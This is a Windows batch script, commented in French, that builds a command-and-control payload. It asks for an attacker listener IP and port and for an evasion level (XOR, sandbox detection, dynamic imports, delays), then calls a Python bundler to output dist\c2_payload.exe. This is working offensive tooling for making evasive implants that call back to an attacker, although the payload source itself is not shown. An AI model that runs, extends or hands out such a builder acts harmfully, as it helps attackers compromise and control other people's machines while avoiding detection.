@echo off
echo ========================================
echo  C2 Payload Builder - Windows
echo ========================================
echo.

:: Demander IP
set /p LISTENER_IP="Enter Listener IP (ex: 192.168.1.40): "
if "%LISTENER_IP%"=="" (
    echo ERROR: IP required!
    pause
    exit /b 1
)

:: Demander Port
set /p LISTENER_PORT="Enter Listener Port (default 4444): "
if "%LISTENER_PORT%"=="" set LISTENER_PORT=4444

:: Demander Obfuscation
echo.
echo Obfuscation Levels:
echo   1 - Base64
echo   2 - XOR + Delays (RECOMMENDED for testing)
echo   3 - Sandbox Detection
echo   4 - Dynamic Imports
echo   5 - Maximum (3-8s delay)
echo.
set /p OBF_LEVEL="Choose level (1-5, default 2): "
if "%OBF_LEVEL%"=="" set OBF_LEVEL=2

echo.
echo ========================================
echo Building payload...
echo ========================================
echo IP: %LISTENER_IP%
echo Port: %LISTENER_PORT%
echo Obfuscation: Level %OBF_LEVEL%
echo Platform: Windows PE x64
echo.

:: Build
python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('%LISTENER_IP%', %LISTENER_PORT%, %OBF_LEVEL%, 'windows')"

if %ERRORLEVEL% EQU 0 (
    echo.
    echo ========================================
    echo  SUCCESS!
    echo ========================================
    echo Output: dist\c2_payload.exe
    echo.
    dir dist\c2_payload.exe
) else (
    echo.
    echo ========================================
    echo  BUILD FAILED!
    echo ========================================
    echo Check the error messages above
)

echo.
pause
